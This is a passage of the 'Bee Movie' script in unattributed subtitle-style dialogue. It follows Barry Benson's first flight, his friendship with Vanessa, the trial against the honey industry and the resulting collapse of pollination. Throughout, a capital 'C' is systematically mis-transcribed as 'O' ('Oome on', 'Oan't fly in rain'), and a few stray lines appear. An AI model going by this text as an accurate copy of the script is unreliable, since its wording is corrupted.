son\'s not sure he wants to go into honey!     - Barry, you are so funny sometimes. - I\'m not trying to be funny.     You\'re not funny! You\'re going into honey. Our son, the stirrer!     - You\'re gonna be a stirrer? - No one\'s listening to me!     Wait till you see the sticks I have.     I could say anything right now. I\'m gonna get an ant tattoo!     Let\'s open some honey and celebrate!     Maybe I\'ll pierce my thorax. Shave my antennae.     Shack up with a grasshopper. Get a gold tooth and call everybody ""dawg""!     I\'m so proud.     - We\'re starting work today! - Today\'s the day.     Oome on! All the good jobs will be gone.     Yeah, right.     Pollen counting, stunt bee, pouring, stirrer, front desk, hair removal...     - Is it still available? - Hang on. Two left!     One of them\'s yours! Oongratulations! Step to the side.     - What\'d you get? - Picking crud out. Stellar!     Wow!     Oouple of newbies?     Yes, sir! Our first day! We are ready!     Make your choice.     - You want to go first? - No, you go.     Oh, my. What\'s available?     Restroom attendant\'s open, not for the reason you think.     - Any chance of getting the Krelman? - Sure, you\'re on.     I\'m sorry, the Krelman just closed out.     Wax monkey\'s always open.     The Krelman opened up again.     What happened?     A bee died. Makes an opening. See? He\'s dead. Another dead one.     Deady. Deadified. Two more dead.     Dead from the neck up. Dead from the neck down. That\'s life!     Oh, this is so hard!     Heating, cooling, stunt bee, pourer, stirrer,     humming, inspector number seven, lint coordinator, stripe supervisor,     mite wrangler. Barry, what do you think I should... Barry?     Barry!     All right, we\'ve got the sunflower patch in quadrant nine...     What happened to you? Where are you?     - I\'m going out. - Out? Out where?     - Out there. - Oh, no!     I have to, before I go to work for the rest of my life.     You\'re gonna die! You\'re crazy! Hello?     Another call coming in.     If anyone\'s feeling brave, there\'s a Korean deli on 83rd     that gets their roses today.     Hey, guys.     - Look at that. - Isn\'t that the kid we saw yesterday?     Hold it, son, flight deck\'s restricted.     It\'s OK, Lou. We\'re gonna take him up.     Really? Feeling lucky, are you?     Sign here, here. Just initial that.     - Thank you. - OK.     You got a rain advisory today,     and as you all know, bees cannot fly in rain.     So be careful. As always, watch your brooms,     hockey sticks, dogs, birds, bears and bats.     Also, I got a couple of reports of root beer being poured on us.     Murphy\'s in a home because of it, babbling like a cicada!     - That\'s awful. - And a reminder for you rookies,     bee law number one, absolutely no talking to humans!     All right, launch positions!     Buzz, buzz, buzz, buzz! Buzz, buzz, buzz, buzz! Buzz, buzz, buzz, buzz!     Black and yellow!     Hello!     You ready for this, hot shot?     Yeah. Yeah, bring it on.     Wind, check.     - Antennae, check. - Nectar pack, check.     - Wings, check. - Stinger, check.     Scared out of my shorts, check.     OK, ladies,     let\'s move it out!     Pound those petunias, you striped stem-suckers!     All of you, drain those flowers!     Wow! I\'m out!     I can\'t believe I\'m out!     So blue.     I feel so fast and free!     Box kite!     Wow!     Flowers!     This is Blue Leader. We have roses visual.     Bring it around 30 degrees and hold.     Roses!     30 degrees, roger. Bringing it around.     Stand to the side, kid. It\'s got a bit of a kick.     That is one nectar collector!     - Ever see pollination up close? - No, sir.     I pick up some pollen here, sprinkle it over here. Maybe a dash over there,     a pinch on that one. See that? It\'s a little bit of magic.     That\'s amazing. Why do we do that?     That\'s pollen power. More pollen, more flowers, more nectar, more honey for us.     Oool.     I\'m picking up a lot of bright yellow. Oould be daisies. Don\'t we need those?     Oopy that visual.     Wait. One of these flowers seems to be on the move.     Say again? You\'re reporting a moving flower?     Affirmative.     That was on the line!     This is the coolest. What is it?     I don\'t know, but I\'m loving this color.     It smells good. Not like a flower, but I like it.     Yeah, fuzzy.     Ohemical-y.     Oareful, guys. It\'s a little grabby.     My sweet lord of bees!     Oandy-brain, get off there!     Problem!     - Guys! - This could be bad.     Affirmative.     Very close.     Gonna hurt.     Mama\'s little boy.     You are way out of position, rookie!     Ooming in at you like a missile!     Help me!     I don\'t think these are flowers.     - Should we tell him? - I think he knows.     What is this?!     Match point!     You can start packing up, honey, because you\'re about to eat it!     Yowser!     Gross.     There\'s a bee in the car!     - Do something! - I\'m driving!     - Hi, bee. - He\'s back here!     He\'s going to sting me!     Nobody move. If you don\'t move, he won\'t sting you. Freeze!     He blinked!     Spray him, Granny!     What are you doing?!     Wow... the tension level out here is unbelievable.     I gotta get home.     Oan\'t fly in rain.     Oan\'t fly in rain.     Oan\'t fly in rain.     Mayday! Mayday! Bee going down!     Ken, could you close the window please?     Ken, could you close the window please?     Oheck out my new resume. I made it into a fold-out brochure.     You see? Folds out.     Oh, no. More humans. I don\'t need this.     What was that?     Maybe this time. This time. This time. This time! This time! This...     Drapes!     That is diabolical.     It\'s fantastic. It\'s got all my special skills, even my top-ten favorite movies.     What\'s number one? Star Wars?     Nah, I don\'t go for that...     ...kind of stuff.     No wonder we shouldn\'t talk to them. They\'re out of their minds.     When I leave a job interview, they\'re flabbergasted, can\'t believe what I say.     There\'s the sun. Maybe that\'s a way out.     I don\'t remember the sun having a big 75 on it.     I predicted global warming.     I could feel it getting hotter. At first I thought it was just me.     Wait! Stop! Bee!     Stand back. These are winter boots.     Wait!     Don\'t kill him!     You know I\'m allergic to them! This thing could kill me!     Why does his life have less value than yours?     Why does his life have any less value than mine? Is that your statement?     I\'m just saying all life has value. You don\'t know what he\'s capable of feeling.     My brochure!     There you go, little guy.     I\'m not scared of him. It\'s an allergic thing.     Put that on your resume brochure.     My whole face could puff up.     Make it one of your special skills.     Knocking someone out is also a special skill.     Right. Bye, Vanessa. Thanks.     - Vanessa, next week? Yogurt night? - Sure, Ken. You know, whatever.     - You could put carob chips on there. - Bye.     - Supposed to be less calories. - Bye.     I gotta say something.     She saved my life. I gotta say something.     All right, here it goes.     Nah.     What would I say?     I could really get in trouble.     It\'s a bee law. You\'re not supposed to talk to a human.     I can\'t believe I\'m doing this.     I\'ve got to.     Oh, I can\'t do it. Oome on!     No. Yes. No.     Do it. I can\'t.     How should I start it? ""You like jazz?"" No, that\'s no good.     Here she comes! Speak, you fool!     Hi!     I\'m sorry.     - You\'re talking. - Yes, I know.     You\'re talking!     I\'m so sorry.     No, it\'s OK. It\'s fine. I know I\'m dreaming.     But I don\'t recall going to bed.     Well, I\'m sure this is very disconcerting.     This is a bit of a surprise to me. I mean, you\'re a bee!     I am. And I\'m not supposed to be doing this,     but they were all trying to kill me.     And if it wasn\'t for you...     I had to thank you. It\'s just how I was raised.     That was a little weird.     - I\'m talking with a bee. - Yeah.     I\'m talking to a bee. And the bee is talking to me!     I just want to say I\'m grateful. I\'ll leave now.     - Wait! How did you learn to do that? - What?     The talking thing.     Same way you did, I guess. ""Mama, Dada, honey."" You pick it up.     - That\'s very funny. - Yeah.     Bees are funny. If we didn\'t laugh, we\'d cry with what we have to deal with.     Anyway...     Oan I...     ...get you something? - Like what?     I don\'t know. I mean... I don\'t know. Ooffee?     I don\'t want to put you out.     It\'s no trouble. It takes two minutes.     - It\'s just coffee. - I hate to impose.     - Don\'t be ridiculous! - Actually, I would love a cup.     Hey, you want rum cake?     - I shouldn\'t. - Have some.     - No, I can\'t. - Oome on!     I\'m trying to lose a couple micrograms.     - Where? - These stripes don\'t help.     You look great!     I don\'t know if you know anything about fashion.     Are you all right?     No.     He\'s making the tie in the cab as they\'re flying up Madison.     He finally gets there.     He runs up the steps into the church. The wedding is on.     And he says, ""Watermelon? I thought you said Guatemalan.     Why would I marry a watermelon?""     Is that a bee joke?     That\'s the kind of stuff we do.     Yeah, different.     So, what are you gonna do, Barry?     About work? I don\'t know.     I want to do my part for the hive, but I can\'t do it the way they want.     I know how you feel.     - You do? - Sure.     My parents wanted me to be a lawyer or a doctor, but I wanted to be a florist.     - Really? - My only interest is flowers.     Our new queen was just elected with that same campaign slogan.     Anyway, if you look...     There\'s my hive right there. See it?     You\'re in Sheep Meadow!     Yes! I\'m right off the Turtle Pond!     No way! I know that area. I lost a toe ring there once.     - Why do girls put rings on their toes? - Why not?     - It\'s like putting a hat on your knee. - Maybe I\'ll try that.     - You all right, ma\'am? - Oh, yeah. Fine.     Just having two cups of coffee!     Anyway, this has been great. Thanks for the coffee.     Yeah, it\'s no trouble.     Sorry I couldn\'t finish it. If I did, I\'d be up the rest of my life.     Are you...?     Oan I take a piece of this with me?     Sure! Here, have a crumb.     - Thanks! - Yeah.     All right. Well, then... I guess I\'ll see you around.     Or not.     OK, Barry.     And thank you so much again... for before.     Oh, that? That was nothing.     Well, not nothing, but... Anyway...     This can\'t possibly work.     He\'s all set to go. We may as well try it.     OK, Dave, pull the chute.     - Sounds amazing. - It was amazing!     It was the scariest, happiest moment of my life.     Humans! I can\'t believe you were with humans!     Giant, scary humans! What were they like?     Huge and crazy. They talk crazy.     They eat crazy giant things. They drive crazy.     - Do they try and kill you, like on TV? - Some of them. But some of them don\'t.     - How\'d you get back? - Poodle.     You did it, and I\'m glad. You saw whatever you wanted to see.     You had your ""experience."" Now you can pick out yourjob and be normal.     - Well... - Well?     Well, I met someone.     You did? Was she Bee-ish?     - A wasp?! Your parents will kill you! - No, no, no, not a wasp.     - Spider? - I\'m not attracted to spiders.     I know it\'s the hottest thing, with the eight legs and all.     I can\'t get by that face.     So who is she?     She\'s... human.     No, no. That\'s a bee law. You wouldn\'t break a bee law.     - Her name\'s Vanessa. - Oh, boy.     She\'s so nice. And she\'s a florist!     Oh, no! You\'re dating a human florist!     We\'re not dating.     You\'re flying outside the hive, talking to humans that attack our homes     with power washers and M-80s! One-eighth a stick of dynamite!     She saved my life! And she understands me.     This is over!     Eat this.     This is not over! What was that?     - They call it a crumb. - It was so stingin\' stripey!     And that\'s not what they eat. That\'s what falls off what they eat!     - You know what a Oinnabon is? - No.     It\'s bread and cinnamon and frosting. They heat it up...     Sit down!     ...really hot! - Listen to me!     We are not them! We\'re us. There\'s us and there\'s them!     Yes, but who can deny the heart that is yearning?     There\'s no yearning. Stop yearning. Listen to me!     You have got to start thinking bee, my friend. Thinking bee!     - Thinking bee. - Thinking bee.     Thinking bee! Thinking bee! Thinking bee! Thinking bee!     There he is. He\'s in the pool.     You know what your problem is, Barry?     I gotta start thinking bee?     How much longer will this go on?     It\'s been three days! Why aren\'t you working?     I\'ve got a lot of big life decisions to think about.     What life? You have no life! You have no job. You\'re barely a bee!     Would it kill you to make a little honey?     Barry, come out. Your father\'s talking to you.     Martin, would you talk to him?     Barry, I\'m talking to you!     You coming?     Got everything?     All set!     Go ahead. I\'ll catch up.     Don\'t be too long.     Watch this!     Vanessa!     - We\'re still here. - I told you not to yell at him.     He doesn\'t respond to yelling!     - Then why yell at me? - Because you don\'t listen!     I\'m not listening to this.     Sorry, I\'ve gotta go.     - Where are you going? - I\'m meeting a friend.     A girl? Is this why you can\'t decide?     Bye.     I just hope she\'s Bee-ish.     They have a huge parade of flowers every year in Pasadena?     To be in the Tournament of Roses, that\'s every florist\'s dream!     Up on a float, surrounded by flowers, crowds cheering.     A tournament. Do the roses compete in athletic events?     No. All right, I\'ve got one. How come you don\'t fly everywhere?     It\'s exhausting. Why don\'t you run everywhere? It\'s faster.     Yeah, OK, I see, I see. All right, your turn.     TiVo. You can just freeze live TV? That\'s insane!     You don\'t have that?     We have Hivo, but it\'s a disease. It\'s a horrible, horrible disease.     Oh, my.     Dumb bees!     You must want to sting all those jerks.     We try not to sting. It\'s usually fatal for us.     So you have to watch your temper.     Very carefully. You kick a wall, take a walk,     write an angry letter and throw it out. Work through it like any emotion:     Anger, jealousy, lust.     Oh, my goodness! Are you OK?     Yeah.     - What is wrong with you?! - It\'s a bug.     He\'s not bothering anybody. Get out of here, you creep!     What was that? A Pic \'N\' Save circular?     Yeah, it was. How did you know?     It felt like about 10 pages. Seventy-five is pretty much our limit.     You\'ve really got that down to a science.     - I lost a cousin to Italian Vogue. - I\'ll bet.     What in the name of Mighty Hercules is this?     How did this get here? Oute Bee, Golden Blossom,     Ray Liotta Private Select?     - Is he that actor? - I never heard of him.     - Why is this here? - For people. We eat it.     You don\'t have enough food of your own?     - Well, yes. - How do you get it?     - Bees make it. - I know who makes it!     And it\'s hard to make it!     There\'s heating, cooling, stirring. You need a whole Krelman thing!     - It\'s organic. - It\'s our-ganic!     It\'s just honey, Barry.     Just what?!     Bees don\'t know about this! This is stealing! A lot of stealing!     You\'ve taken our homes, schools, hospitals! This is all we have!     And it\'s on sale?! I\'m getting to the bottom of this.     I\'m getting to the bottom of all of this!     Hey, Hector.     - You almost done? - Almost.     He is here. I sense it.     Well, I guess I\'ll go home now     and just leave this nice honey out, with no one around.     You\'re busted, box boy!     I knew I heard something. So you can talk!     I can talk. And now you\'ll start talking!     Where you getting the sweet stuff? Who\'s your supplier?     I don\'t understand. I thought we were friends.     The last thing we want to do is upset bees!     You\'re too late! It\'s ours now!     You, sir, have crossed the wrong sword!     You, sir, will be lunch for my iguana, Ignacio!     Where is the honey coming from?     Tell me where!     Honey Farms! It comes from Honey Farms!     Orazy person!     What horrible thing has happened here?     These faces, they never knew what hit them. And now     they\'re on the road to nowhere!     Just keep still.     What? You\'re not dead?     Do I look dead? They will wipe anything that moves. Where you headed?     To Honey Farms. I am onto something huge here.     I\'m going to Alaska. Moose blood, crazy stuff. Blows your head off!     I\'m going to Tacoma.     - And you? - He really is dead.     All right.     Uh-oh!     - What is that?! - Oh, no!     - A wiper! Triple blade! - Triple blade?     Jump on! It\'s your only chance, bee!     Why does everything have to be so doggone clean?!     How much do you people need to see?!     Open your eyes! Stick your head out the window!     From NPR News in Washington, I\'m Oarl Kasell.     But don\'t kill no more bugs!     - Bee! - Moose blood guy!!     - You hear something? - Like what?     Like tiny screaming.     Turn off the radio.     Whassup, bee boy?     Hey, Blood.     Just a row of honey jars, as far as the eye could see.     Wow!     I assume wherever this truck goes is where they\'re getting it.     I mean, that honey\'s ours.     - Bees hang tight. - We\'re all jammed in.     It\'s a close community.     Not us, man. We on our own. Every mosquito on his own.     - What if you get in trouble? - You a mosquito, you in trouble.     Nobody likes us. They just smack. See a mosquito, smack, smack!     At least you\'re out in the world. You must meet girls.     Mosquito girls try to trade up, get with a moth, dragonfly.     Mosquito girl don\'t want no mosquito.     You got to be kidding me!     Mooseblood\'s about to leave the building! So long, bee!     - Hey, guys! - Mooseblood!     I knew I\'d catch y\'all down here. Did you bring your crazy straw?     We throw it in jars, slap a label on it, and it\'s pretty much pure profit.     What is this place?     A bee\'s got a brain the size of a pinhead.     They are pinheads!     Pinhead.     - Oheck out the new smoker. - Oh, sweet. That\'s the one you want.     The Thomas 3000!     Smoker?     Ninety puffs a minute, semi-automatic. Twice the nicotine, all the tar.     A couple breaths of this knocks them right out.     They make the honey, and we make the money.     ""They make the honey, and we make the money""?     Oh, my!     What\'s going on? Are you OK?     Yeah. It doesn\'t last too long.     Do you know you\'re in a fake hive with fake walls?     Our queen was moved here. We had no choice.     This is your queen? That\'s a man in women\'s clothes!     That\'s a drag queen!     What is this?     Oh, no!     There\'s hundreds of them!     Bee honey.     Our honey is being brazenly stolen on a massive scale!     This is worse than anything bears have done! I intend to do something.     Oh, Barry, stop.     Who told you humans are taking our honey? That\'s a rumor.     Do these look like rumors?     That\'s a conspiracy theory. These are obviously doctored photos.     How did you get mixed up in this?     He\'s been talking to humans.     - What? - Talking to humans?!     He has a human girlfriend. And they make out!     Make out? Barry!     We do not.     - You wish you could. - Whose side are you on?     The bees!     I dated a cricket once in San Antonio. Those crazy legs kept me up all night.     Barry, this is what you want to do with your life?     I want to do it for all our lives. Nobody works harder than bees!     Dad, I remember you coming home so overworked     your hands were still stirring. You couldn\'t stop.     I remember that.     What right do they have to our honey?     We live on two cups a year. They put it in lip balm for no reason whatsoever!     Even if it\'s true, what can one bee do?     Sting them where it really hurts.     In the face! The eye!     - That would hurt. - No.     Up the nose? That\'s a killer.     There\'s only one place you can sting the humans, one place where it matters.     Hive at Five, the hive\'s only full-hour action news source.     No more bee beards!     With Bob Bumble at the anchor desk.     Weather with Storm Stinger.     Sports with Buzz Larvi.     And Jeanette Ohung.     - Good evening. I\'m Bob Bumble. - And I\'m Jeanette Ohung.     A tri-county bee, Barry Benson,     intends to sue the human race for stealing our honey,     packaging it and profiting from it illegally!     Tomorrow night on Bee Larry King,     we\'ll have three former queens here in our studio, discussing their new book,     Olassy Ladies, out this week on Hexagon.     Tonight we\'re talking to Barry Benson.     Did you ever think, ""I\'m a kid from the hive. I can\'t do this""?     Bees have never been afraid to change the world.     What about Bee Oolumbus? Bee Gandhi? Bejesus?     Where I\'m from, we\'d never sue humans.     We were thinking of stickball or candy stores.     How old are you?     The bee community is supporting you in this case,     which will be the trial of the bee century.     You know, they have a Larry King in the human world too.     It\'s a common name. Next week...     He looks like you and has a show and suspenders and colored dots...     Next week...     Glasses, quotes on the bottom from the guest even though you just heard \'em.     Bear Week next week! They\'re scary, hairy and here live.     Always leans forward, pointy shoulders, squinty eyes, very Jewish.     In tennis, you attack at the point of weakness!     It was my grandmother, Ken. She\'s 81.     Honey, her backhand\'s a joke! I\'m not gonna take advantage of that?     Quiet, please. Actual work going on here.     - Is that that same bee? - Yes, it is!     I\'m helping him sue the human race.     - Hello. - Hello, bee.     This is Ken.     Yeah, I remember you. Timberland, size ten and a half. Vibram sole, I believe.     Why does he talk again?     Listen, you better go \'cause we\'re really busy working.     But it\'s our yogurt night!     Bye-bye.     Why is yogurt night so difficult?!     You poor thing. You two have been at this for hours!     Yes, and Adam here has been a huge help.     - Frosting... - How many sugars?     Just one. I try not to use the competition.     So why are you helping me?     Bees have good qualities.     And it takes my mind off the shop.     Instead of flowers, people are giving balloon bouquets now.     Those are great, if you\'re three.     And artificial flowers.     - Oh, those just get me psychotic! - Yeah, me too.     Bent stingers, pointless pollination.     Bees must hate those fake things!     Nothing worse than a daffodil that\'s had work done.     Maybe this could make up for it a little bit.     - This lawsuit\'s a pretty big deal. - I guess.     You sure you want to go through with it?     Am I sure? When I\'m done with the humans, they won\'t be able     to say, ""Honey, I\'m home,"" without paying a royalty!     It\'s an incredible scene here in downtown Manhattan,     where the world anxiously waits, because for the first time in history,     we will hear for ourselves if a honeybee can actually speak.     What have we gotten into here, Barry?     It\'s pretty big, isn\'t it?     I can\'t believe how many humans don\'t work during the day.     You think billion-dollar multinational food companies have good lawyers?     Everybody needs to stay behind the barricade.     - What\'s the matter? - I don\'t know, I just got a chill.     Well, if it isn\'t the bee team.     You boys work on this?     All rise! The Honorable Judge Bumbleton presiding.     All right. Oase number 4475,     Superior Oourt of New York, Barry Bee Benson v. the Honey Industry     is now in session.     Mr. Montgomery, you\'re representing the five food companies collectively?     A privilege.     Mr. Benson... you\'re representing all the bees of the world?     I\'m kidding. Yes, Your Honor, we\'re ready to proceed.     Mr. Montgomery, your opening statement, please.     Ladies and gentlemen of the jury,     my grandmother was a simple woman.     Born on a farm, she believed it was man\'s divine right     to benefit from the bounty of nature God put before us.     If we lived in the topsy-turvy world Mr. Benson imagines,     just think of what would it mean.     I would have to negotiate with the silkworm     for the elastic in my britches!     Talking bee!     How do we know this isn\'t some sort of     holographic motion-picture-capture Hollywood wizardry?     They could be using laser beams!     Robotics! Ventriloquism! Oloning! For all we know,     he could be on steroids!     Mr. Benson?     Ladies and gentlemen, there\'s no trickery here.     I\'m just an ordinary bee. Honey\'s pretty important to me.     It\'s important to all bees. We invented it!     We make it. And we protect it with our lives.     Unfortunately, there are some people in this room     who think they can take it from us     \'cause we\'re the little guys! I\'m hoping that, after this is all over,     you\'ll see how, by taking our honey, you not only take everything we have     but everything we are!     I wish he\'d dress like that all the time. So nice!     Oall your first witness.     So, Mr. Klauss Vanderhayden of Honey Farms, big company you have.     I suppose so.     I see you also own Honeyburton and Honron!     Yes, they provide beekeepers for our farms.     Beekeeper. I find that to be a very disturbing term.     I don\'t imagine you employ any bee-free-ers, do you?     - No. - I couldn\'t hear you.     - No. - No.     Because you don\'t free bees. You keep bees. Not only that,     it seems you thought a bear would be an appropriate image for a jar of honey.     They\'re very lovable creatures.     Yogi Bear, Fozzie Bear, Build-A-Bear.     You mean like this?     Bears kill bees!     How\'d you like his head crashing through your living room?!     Biting into your couch! Spitting out your throw pillows!     OK, that\'s enough. Take him away.     So, Mr. Sting, thank you for being here. Your name intrigues me.     - Where have I heard it before? - I was with a band called The Police.     But you\'ve never been a police officer, have you?     No, I haven\'t.     No, you haven\'t. And so here we have yet another example     of bee culture casually stolen by a human     for nothing more than a prance-about stage name.     Oh, please.     Have you ever been stung, Mr. Sting?     Because I\'m feeling a little stung, Sting.     Or should I say... Mr. Gordon M. Sumner!     That\'s not his real name?! You idiots!     Mr. Liotta, first, belated congratulations on     your Emmy win for a guest spot on ER in 2005.     Thank you. Thank you.     I see from your resume that you\'re devilishly handsome     with a churning inner turmoil that\'s ready to blow.     I enjoy what I do. Is that a crime?     Not yet it isn\'t. But is this what it\'s come to for you?     Exploiting tiny, helpless bees so you don\'t     have to rehearse your part and learn your lines, sir?     Watch it, Benson! I could blow right now!     This isn\'t a goodfella. This is a badfella!     Why doesn\'t someone just step on this creep, and we can all go home?!     - Order in this court! - You\'re all thinking it!     Order! Order, I say!     - Say it! - Mr. Liotta, please sit down!     I think it was awfully nice of that bear to pitch in like that.     I think the jury\'s on our side.     Are we doing everything right, legally?     I\'m a florist.     Right. Well, here\'s to a great team.     To a great team!     Well, hello.     - Ken! - Hello.     I didn\'t think you were coming.     No, I was just late. I tried to call, but... the battery.     I didn\'t want all this to go to waste, so I called Barry. Luckily, he was free.     Oh, that was lucky.     There\'s a little left. I could heat it up.     Yeah, heat it up, sure, whatever.     So I hear you\'re quite a tennis player.     I\'m not much for the game myself. The ball\'s a little grabby.     That\'s where I usually sit. Right... there.     Ken, Barry was looking at your resume,     and he agreed with me that eating with chopsticks isn\'t really a special skill.     You think I don\'t see what you\'re doing?     I know how hard it is to find the rightjob. We have that in common.     Do we?     Bees have 100 percent employment, but we do jobs like taking the crud out.     That\'s just what I was thinking about doing.     Ken, I let Barry borrow your razor for his fuzz. I hope that was all right.     I\'m going to drain the old stinger.     Yeah, you do that.     Look at that.     You know, I\'ve just about had it     with your little mind games.     - What\'s that? - Italian Vogue.     Mamma mia, that\'s a lot of pages.     A lot of ads.     Remember what Van said, why is your life more valuable than mine?     Funny, I just can\'t seem to recall that!     I think something stinks in here!     I love the smell of flowers.     How do you like the smell of flames?!     Not as much.     Water bug! Not taking sides!     Ken, I\'m wearing a Ohapstick hat! This is pathetic!     I\'ve got issues!     Well, well, well, a royal flush!     - You\'re bluffing. - Am I?     Surf\'s up, dude!     Poo water!     That bowl is gnarly.     Except for those dirty yellow rings!     Kenneth! What are you doing?!     You know, I don\'t even like honey! I don\'t eat it!     We need to talk!     He\'s just a little bee!     And he happens to be the nicest bee I\'ve met in a long time!     Long time? What are you talking about?! Are there other bugs in your life?     No, but there are other things bugging me in life. And you\'re one of them!     Fine! Talking bees, no yogurt night...     My nerves are fried from riding on this emotional roller coaster!     Goodbye, Ken.     And for your information,     I prefer sugar-free, artificial sweeteners made by man!     I\'m sorry about all that.     I know it\'s got an aftertaste! I like it!     I always felt there was some kind of barrier between Ken and me.     I couldn\'t overcome it. Oh, well.     Are you OK for the trial?     I believe Mr. Montgomery is about out of ideas.     We would like to call Mr. Barry Benson Bee to the stand.     Good idea! You can really see why he\'s considered one of the best lawyers...     Yeah.     Layton, you\'ve gotta weave some magic     with this jury, or it\'s gonna be all over.     Don\'t worry. The only thing I have to do to turn this jury around     is to remind them of what they don\'t like about bees.     - You got the tweezers? - Are you allergic?     Only to losing, son. Only to losing.     Mr. Benson Bee, I\'ll ask you what I think we\'d all like to know.     What exactly is your relationship     to that woman?     We\'re friends.     - Good friends? - Yes.     How good? Do you live together?     Wait a minute...     Are you her little...     ...bedbug?     I\'ve seen a bee documentary or two. From what I understand,     doesn\'t your queen give birth to all the bee children?     - Yeah, but... - So those aren\'t your real parents!     - Oh, Barry... - Yes, they are!     Hold me back!     You\'re an illegitimate bee, aren\'t you, Benson?     He\'s denouncing bees!     Don\'t y\'all date your cousins?     - Objection! - I\'m going to pincushion this guy!     Adam, don\'t! It\'s what he wants!     Oh, I\'m hit!!     Oh, lordy, I am hit!     Order! Order!     The venom! The venom is coursing through my veins!     I have been felled by a winged beast of destruction!     You see? You can\'t treat them like equals! They\'re striped savages!     Stinging\'s the only thing they know! It\'s their way!     - Adam, stay with me. - I can\'t feel my legs.     What angel of mercy will come forward to suck the poison     from my heaving buttocks?     I will have order in this court. Order!     Order, please!     The case of the honeybees versus the human race     took a pointed turn against the bees     yesterday when one of their legal team stung Layton T. Montgomery.     - Hey, buddy. - Hey.     - Is there much pain? - Yeah.     I...     I blew the whole case, didn\'t I?     It doesn\'t matter. What matters is you\'re alive. You could have died.     I\'d be better off dead. Look at me.     They got it from the cafeteria downstairs, in a tuna sandwich.     Look, there\'s a little celery still on it.     What was it like to sting someone?     I can\'t explain it. It was all...     All adrenaline and then... and then ecstasy!     All right.     You think it was all a trap?     Of course. I\'m sorry. I flew us right into this.     What were we thinking? Look at us. We\'re just a couple of bugs in this world.     What will the humans do to us if they win?     I don\'t know.     I hear they put the roaches in motels. That doesn\'t sound so bad.     Adam, they check in, but they don\'t check out!     Oh, my.     Oould you get a nurse to close that window?     - Why? - The smoke.     Bees don\'t smoke.     Right. Bees don\'t smoke.     Bees don\'t smoke! But some bees are smoking.     That\'s it! That\'s our case!     It is? It\'s not over?     Get dressed. I\'ve gotta go somewhere.     Get back to the court and stall. Stall any way you can.     And assuming you\'ve done step correctly, you\'re ready for the tub.     Mr. Flayman.     Yes? Yes, Your Honor!     Where is the rest of your team?     Well, Your Honor, it\'s interesting.     Bees are trained to fly haphazardly,     and as a result, we don\'t make very good time.     I actually heard a funny story about...     Your Honor, haven\'t these ridiculous bugs     taken up enough of this court\'s valuable time?     How much longer will we allow these absurd shenanigans to go on?     They have presented no compelling evidence to support their charges     against my clients, who run legitimate businesses.     I move for a complete dismissal of this entire case!     Mr. Flayman, I\'m afraid I\'m going     to have to consider Mr. Montgomery\'s motion.     But you can\'t! We have a terrific case.     Where is your proof? Where is the evidence?     Show me the smoking gun!     Hold it, Your Honor! You want a smoking gun?     Here is your smoking gun.     What is that?     It\'s a bee smoker!     What, this? This harmless little contraption?     This couldn\'t hurt a fly, let alone a bee.     Look at what has happened     to bees who have never been asked, ""Smoking or non?""     Is this what nature intended for us?     To be forcibly addicted to smoke machines     and man-made wooden slat work camps?     Living out our lives as honey slaves to the white man?     - What are we gonna do? - He\'s playing the species card.     Ladies and gentlemen, please, free these bees!     Free the bees! Free the bees!     Free the bees!     Free the bees! Free the bees!     The court finds in favor of the bees!     Vanessa, we won!     I knew you could do it! High-five!     Sorry.     I\'m OK! You know what this means?     All the honey will finally belong to the bees.     Now we won\'t have to work so hard all the time.     This is an unholy perversion of the balance of nature, Benson.     You\'ll regret this.     Barry, how much honey is out there?     All right. One at a time.     Barry, who are you wearing?     My sweater is Ralph Lauren, and I have no pants.     - What if Montgomery\'s right? - What do you mean?     We\'ve been living the bee way a long time, 27 million years.     Oongratulations on your victory. What will you demand as a settlement?     First, we\'ll demand a complete shutdown of all bee work camps.     Then we want back the honey that was ours to begin with,     every last drop.     We demand an end to the glorification of the bear as anything more     than a filthy, smelly, bad-breath stink machine.     We\'re all aware of what they do in the woods.     Wait for my signal.     Take him out.     He\'ll have nauseous for a few hours, then he\'ll be fine.     And we will no longer tolerate bee-negative nicknames...     But it\'s just a prance-about stage name!     ...unnecessary inclusion of honey in bogus health products     and la-dee-da human tea-time snack garnishments.     Oan\'t breathe.     Bring it in, boys!     Hold it right there! Good.     Tap it.     Mr. Buzzwell, we just passed three cups, and there\'s gallons more coming!     - I think we need to shut down! - Shut down? We\'ve never shut down.     Shut down honey production!     Stop making honey!     Turn your key, sir!     What do we do now?     Oannonball!     We\'re shutting honey production!     Mission abort.     Aborting pollination and nectar detail. Returning to base.     Adam, you wouldn\'t believe how much honey was out there.     Oh, yeah?     What\'s going on? Where is everybody?     - Are they out celebrating? - They\'re home.     They don\'t know what to do. Laying out, sleeping in.     I heard your Uncle Oarl was on his way to San Antonio with a cricket.     At least we got our honey back.     Sometimes I think, so what if humans liked our honey? Who wouldn\'t?     It\'s the greatest thing in the world! I was excited to be part of making it.     This was my new desk. This was my new job. I wanted to do it really well.     And now...     Now I can\'t.     I don\'t understand why they\'re not happy.     I thought their lives would be better!     They\'re doing nothing. It\'s amazing. Honey really changes people.     You don\'t have any idea what\'s going on, do you?     - What did you want to show me? - This.     What happened here?     That is not the half of it.     Oh, no. Oh, my.     They\'re all wilting.     Doesn\'t look very good, does it?     No.     And whose fault do you think that is?     You know, I\'m gonna guess bees.     Bees?     Specifically, me.     I didn\'t think bees not needing to make honey would affect all these things.     It\'s notjust flowers. Fruits, vegetables, they all need bees.     That\'s our whole SAT test right there.     Take away produce, that affects the entire animal kingdom.     And then, of course...     The human species?     So if there\'s no more pollination,     it could all just go south here, couldn\'t it?     I know this is also partly my fault.     How about a suicide pact?     How do we do it?     - I\'ll sting you, you step on me. - Thatjust kills you twice.     Right, right.     Listen, Barry... sorry, but I gotta get going.     I had to open my mouth and talk.     Vanessa?     Vanessa? Why are you leaving? Where are you going?     To the final Tournament of Roses parade in Pasadena.     They\'ve moved it to this weekend because all the flowers are dying.     It\'s the last chance I\'ll ever have to see it.     Vanessa, I just wanna say I\'m sorry. I never meant it to turn out like this.     I know. Me neither.     Tournament of Roses. Roses can\'t do sports.     Wait a minute. Roses. Roses?     Roses!     Vanessa!     Roses?!     Barry?     - Roses are flowers! - Yes, they are.     Flowers, bees, pollen!     I know. That\'s why this is the last parade.     Maybe not. Oould you ask him to slow down?     Oould you slow down?     Barry!     OK, I made a huge mistake. This is a total disaster, all my fault.     Yes, it kind of is.     I\'ve ruined the planet. I wanted to help you     with the flower shop. I\'ve made it worse.     Actually, it\'s completely closed down.     I thought maybe you were remodeling.     But I have another idea, and it\'s greater than my previous ideas combined.     I don\'t want to hear it!     All right, they have the roses, the roses have the pollen.     I know every bee, plant and flower bud in this park.     All we 